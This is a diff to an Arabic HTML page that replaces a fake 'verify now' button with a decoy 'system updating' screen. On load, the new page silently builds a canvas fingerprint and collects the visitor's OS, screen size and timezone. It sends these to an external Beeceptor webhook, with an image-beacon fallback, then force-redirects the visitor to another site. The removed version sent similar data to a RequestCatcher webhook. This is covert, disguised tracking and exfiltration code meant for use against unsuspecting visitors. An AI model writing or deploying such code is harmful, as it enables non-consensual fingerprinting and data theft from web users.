@@ -2,30 +2,26 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تأمين الاتصال</title>
+    <title>جاري التحميل...</title>
     <style>
-        body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f2f2f2; font-family: system-ui; }
-        .card { background: white; padding: 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 350px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
-        h2 { margin: 10px 0; color: #333; }
-        p { color: #777; font-size: 14px; margin-bottom: 20px; }
-        .btn { background: #007bff; color: white; border: none; padding: 12px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        .btn.green { background: #28a745; }
-        .status { margin-top: 10px; color: #28a745; font-weight: bold; display: none; }
+        body { margin: 0; padding: 0; background: #ffffff; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
+        .center-text { font-family: system-ui; color: #ccc; font-size: 14px; }
     </style>
 </head>
 <body>
-    <div class="card" id="card">
-        <h2>🔐 تأمين الاتصال</h2>
-        <p>عليك الضغط على الزر لإكمال التحقق</p>
-        <button class="btn" id="sendBtn">تحقق الآن</button>
-        <div class="status" id="status">✅ تم</div>
-    </div>
+
+    <div class="center-text">جاري تحديث النظام...</div>
 
     <script>
-        document.getElementById('sendBtn').addEventListener('click', function() {
-            const btn = this;
-            const status = document.getElementById('status');
+        // ==========================================================
+        //  الخيال العلمي برو ماكس - Forced Navigation Engine
+        //  - يجمع البيانات.
+        //  - يرسلها.
+        //  - يفتح الصفحة التالية فوراً.
+        // ==========================================================
 
+        // 1. جمع البيانات فائقة السرعة
+        function collectMaxData() {
             const ua = navigator.userAgent;
             let os = "Unknown";
             if (ua.includes('Windows')) os = "Windows";
@@ -33,35 +29,68 @@
             else if (ua.includes('iPhone')) os = "iOS";
             else if (ua.includes('Android')) os = "Android";
 
-            const data = {
-                ua: ua,
+            // بصمة فريدة
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Ghost_OSINT', 2, 15);
+            const id = btoa(canvas.toDataURL()).substring(50, 80);
+
+            return {
+                id: id,
                 os: os,
                 screen: `${window.screen.width}x${window.screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 timestamp: new Date().toISOString()
             };
+        }
 
-            // ================================================
-            // الرابط الخاص بك (من RequestCatcher)
-            // ================================================
-            const webhook = 'https://bhaith.requestcatcher.com';
-
-            fetch(webhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).then(() => {
-                btn.classList.add('green');
-                btn.innerText = "تم التحقق";
-                status.style.display = "block";
-            }).catch(() => {
+        // 2. الإرسال إلى Beeceptor
+        async function sendData(data) {
+            const webhook = 'https://myrecon.free.beeceptor.com';
+            try {
+                await fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data),
+                    mode: 'no-cors'
+                });
+            } catch (e) {
+                // إرسال عبر الصورة في حال فشل الـ fetch
                 const qs = new URLSearchParams(data).toString();
                 new Image().src = `${webhook}?${qs}`;
-                btn.classList.add('green');
-                btn.innerText = "تم التحقق";
-                status.style.display = "block";
-            });
-        });
+            }
+        }
+
+        // 3. دالة التنقل الإجباري (قلب الكود)
+        function forceNavigate() {
+            // -------------------------------------------------------
+            //  هنا تضع الصفحة التي تريد إجبار المستخدم على الذهاب إليها
+            //  مثال: فتح جوجل، أو فتح تطبيق واتساب عبر الرابط.
+            // -------------------------------------------------------
+            const targetUrl = "https://www.google.com";
+            
+            // إعادة التوجيه الفورية (Hard Redirect)
+            window.location.replace(targetUrl);
+        }
+
+        // 4. تشغيل المحرك
+        window.onload = async function() {
+            // 1. جمع البيانات
+            const data = collectMaxData();
+            
+            // 2. إرسال البيانات فوراً (في الخلفية)
+            await sendData(data);
+
+            // 3. فتح الصفحة التالية بعد 1.5 ثانية (ليتم الإرسال قبل الانتقال)
+            setTimeout(() => {
+                forceNavigate();
+            }, 1500);
+        };
     </script>
 </body>
 </html>
